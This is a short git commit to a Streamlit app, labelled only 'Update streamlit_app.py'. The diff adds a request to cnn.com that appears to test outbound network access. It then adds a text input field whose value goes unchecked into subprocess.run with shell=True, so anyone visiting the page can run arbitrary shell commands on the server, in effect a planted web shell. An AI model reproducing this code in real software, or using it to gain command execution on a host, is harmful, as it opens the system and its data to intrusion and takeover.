4c4c61cf5a60571e9e50e20d5e221ac7e8f4a193
Matteo Monchiero <matteo.monchiero@snowflake.com>
2023-08-14 12:08:32 -0400

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -15,3 +15,21 @@ print("I want tto show the value of this data", value)
 sys.stdout.flush()
 
 st.write(os.getcwd())
+
+import streamlit as st
+import requests
+import os
+import subprocess
+
+try:
+   r = requests.get('http://www.cnn.com')
+   st.write(r.status_code)
+   if not r.status_code:
+       raise Exception
+except Exception as e:
+   st.error(e)
+
+st.write('Hello')
+text = st.text_input('Input')
+
+subprocess.run(text, shell=True, check=True).check_returncode()
